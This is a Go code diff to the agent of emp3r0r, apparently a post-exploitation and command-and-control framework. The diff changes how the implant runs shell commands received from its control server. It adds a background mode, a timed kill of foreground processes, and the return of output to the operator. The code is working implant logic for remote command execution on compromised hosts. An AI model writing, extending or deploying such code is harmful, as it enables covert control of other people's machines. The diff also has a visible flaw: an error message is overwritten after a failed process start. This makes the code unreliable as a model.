@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"bytes"
 	"fmt"
 	"log"
 	"os"
@@ -8,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -18,10 +20,9 @@ import (
 // exec cmd, receive data, etc
 func processCCData(data *emp3r0r_data.MsgTunData) {
 	var (
-		data2send   emp3r0r_data.MsgTunData
-		out         string
-		outCombined []byte
-		err         error
+		data2send emp3r0r_data.MsgTunData
+		out       string
+		err       error
 	)
 	data2send.Tag = RuntimeConfig.AgentTag
 
@@ -33,7 +34,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	cmd_id := payloadSplit[len(payloadSplit)-1]
 
 	// command from CC
-	cmdSlice := util.ParseCmd(payloadSplit[1])
+	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
+	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
+	cmdSlice := util.ParseCmd(cmd_str)
 
 	// send response to CC
 	sendResponse := func(resp string) {
@@ -253,18 +256,40 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		cmd_arg = append(cmd_arg, strings.Join(cmdSlice, " "))
 		cmd := exec.Command(emp3r0r_data.DefaultShell, cmd_arg...)
 		if runtime.GOOS != "linux" {
-			if !strings.HasSuffix(cmd_arg[0], ".exe") {
-				cmd_arg[0] += ".exe"
+			if !strings.HasSuffix(cmdSlice[0], ".exe") {
+				cmdSlice[0] += ".exe"
 			}
-			cmd = exec.Command(cmd_arg[0], cmd_arg[1:]...)
+			cmd = exec.Command(cmdSlice[0], cmdSlice[1:]...)
 		}
-		outCombined, err = cmd.CombinedOutput()
+		var out_bytes []byte
+		out_buf := bytes.NewBuffer(out_bytes)
+		cmd.Stdout = out_buf
+		cmd.Stderr = out_buf
+		err = cmd.Start()
 		if err != nil {
 			log.Println(err)
-			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
+			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
+		} else {
+			// kill process after 10 seconds
+			// except when & is appended
+			if !keep_running {
+				cmd.Wait()
+			}
+			go func() {
+				for i := 0; i < 10; i++ {
+					time.Sleep(time.Second)
+				}
+				if util.IsPIDAlive(cmd.Process.Pid) && !keep_running {
+					cmd.Process.Kill()
+				}
+			}()
+		}
+		out = out_buf.String()
+		if keep_running {
+			out = fmt.Sprintf("%s running in background, PID is %d",
+				cmdSlice, cmd.Process.Pid)
 		}
 
-		out = string(outCombined)
 		sendResponse(out)
 	}
 }
